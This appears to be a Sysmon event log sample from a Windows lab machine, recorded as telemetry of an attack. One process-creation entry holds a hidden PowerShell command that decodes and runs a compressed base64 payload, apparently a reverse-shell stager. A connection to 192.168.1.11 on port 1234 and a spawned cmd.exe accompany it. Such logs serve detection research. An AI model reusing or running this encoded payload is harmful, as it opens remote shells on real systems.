{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:20:29.798","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"747F3D96-308D-6095-D004-000000001D00","ProcessId":2552,"RuleName":"-","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ppzhc54x.iys.ps1","UtcTime":"2021-05-07 12:20:29.798"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1514,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:29.860430Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":1234,"DestinationPortName":"-","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","Initiated":true,"ProcessGuid":"747F3D96-308D-6095-D004-000000001D00","ProcessId":2552,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50582,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:20:32.233"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":1515,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:33.449396Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:37.687"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1516,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:37.837339Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:37.882"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1517,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:38.836868Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:37.885"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1518,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:38.840836Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:37.917"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1519,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:38.844769Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:37.918"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1520,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:38.848712Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:39.866"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1521,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:40.897447Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:39.867"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1522,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:40.899905Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:39.892"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1523,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:40.902370Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:39.893"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1524,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:40.904849Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\Windows\\system32\\cmd.exe","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows Command Processor","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Hashes":"MD5=DB126FF10E71753C0C29210C090927A3,SHA256=B94D1C553C7EF81DF040D6BE59120EB0A8F67AEC1A787A2B6B537309CBAF8CC4,IMPHASH=392B4D61B1D1DADC1F06444DF258188A","Image":"C:\\Windows\\SysWOW64\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"Cmd.Exe","ParentCommandLine":"\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPgilWACA7VW+2+bSBD+OZHyP6DKkkF1DH5cm0SqdAs2No1xcPDbtaoNrPHWC+vCEsft9X+/wYY0VZO79qRDfuxjZnbmm29nWKWRJyiPJNEj0tez0xMHxziU5FJQr0glL3RHpnJyAuslPG9cSO8keYG22xYPMY2WV1dGGsckEsd5tUMEShIS3jFKElmR/pImaxKT85u7T8QT0lep9LHaYfwOs1xsb2BvTaRzFPnZXo97OHOm6m4ZFXL5w4eysjivLavtzylmiVx294kgYdVnrKxI35TswOF+S+SyTb2YJ3wlqhMaNerVUZTgFemDtXtiE7HmflJWIAr4xESkcSQd4skMHLflMgydmHvI92OSJOWKtMhML5bLP+VFfu5tGgkakqoVCRLzrUvie+qRpNrFkc/ILVktQcsVMY2CpaKA2D3fELkUpYxVpN8xI/fJrkDtV5Xkp0og5YhYqUAin4nT5n7KyFGz/IyjkHwFnkcCAHLfzk7PTlcFWTZ32/bHp3SB0cniMCbgnuzwhB4E30laRbLhICx4vIdpaRinRFk+giuVkk+Vl7VrhSgIBuFNSmFtMebUX4JOntAS34+u69nGy8xskRWNSGsf4ZB6Bfnk52AmK0YOQVYLsT64JZfzDeK3CCMBFhlwWbZ/UmuHVDzq6illPomRB6lKwCvIovKjM8dcyGUrskkIGB3nQL/SCihPCumc5vvi9GwOQmWD4SSpSE4Kd86rSC7BjPgVCUUJzbdQKvhhWP7urp0yQT2ciMLcUnkEMj/Q4FEi4tSDvEHwQ3dLPIpZhkVF6lKf6HuXBsXB5WeRMDBjcBXA0j1kAlYyBFyRsSEGHyHzStUlwgq3jIQgcbj7JsMB3PSc7gfy4ID45Z8cLPh8JG+GRQHCE/cgwS7joiKNaSyghmS4Hnj0X45/UjyOjhgxyVMhF1dkoe9FxutS7NsZJXNUDhjEAuI3Yx7qOCFvmsdCIb9Sb6iD4JlZEbP99xtas3bwteE7slcXjtB4SBsWtz0jcTrmBaK7YOdd9JHnv/fJpTtuCrdtCcNB3QHV9Oba07UhjEeWmFmWsDqoO1x7THPaYa9vJQ/qrjvJbB1teM1md6qhRqN509A2ANyM1oIN8vsh3T30YAwV8aanW4muWaz93ri9m9TN+YR11aa5Xk144r6ZtVRVvfRxy94jpHO/Ye+ntVs+7Hqh3oy4emk0N6iNkBG1x6bOr2d6jBx1jIMt310HulEPDISGLiXzwcjUBwNTR6POp8+tSzVQLydTvNYn4zqdb6e3a5ibu+7gWtWalk++8PkOgOtwhINbkAmMurdegUzrNdJf93lSxxudIx1kzPln1FnPtqbDYH84qnM0Zv0pRr353lTV2sxpoq7GJ50ADUAcB/oAo+S+9aWl1sY+9yd/9GcrdTxlb9WWMXDW0yxmdRtmv7tu69qb13bezduL3oSOQ45Gqjp+lXEGSFP6Ej5hwkt13MZxssYMGAIFuriWJo/NvOY6nGYaspw16g2JI8Kgz0EnLKiNGONeVvGPxRnazbEJZD1pBMNG/dmRIj0KKt9bQbF0dTUHL+GyAJ2rPRIFYl3RHhqaBmVde2hqEOKvB2bw7V7OLFWyrgCw5HbZwa6SXZ8Ss1f/K1j5lV3Dn/+vYH1f+4fdXwJQq2Th/rT448Jvgfm7gU8wFSDoQslh5NjzXog/58WT9wJICmR9lT/Ze91NKs778LZwdvo3FKWIS0EKAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))","ParentImage":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessGuid":"747F3D96-308D-6095-D004-000000001D00","ParentProcessId":2552,"ProcessGuid":"747F3D96-3099-6095-D204-000000001D00","ProcessId":6844,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:20:41.057"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1525,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:41.064635Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:41.535"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1526,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:41.916255Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:41.536"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1527,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:41.921730Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:41.563"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1528,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:41.927150Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:41.564"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1529,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:41.931414Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:42.539"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1530,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:42.929596Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:42.543"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1531,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:42.932297Z"}},"Version":5}}
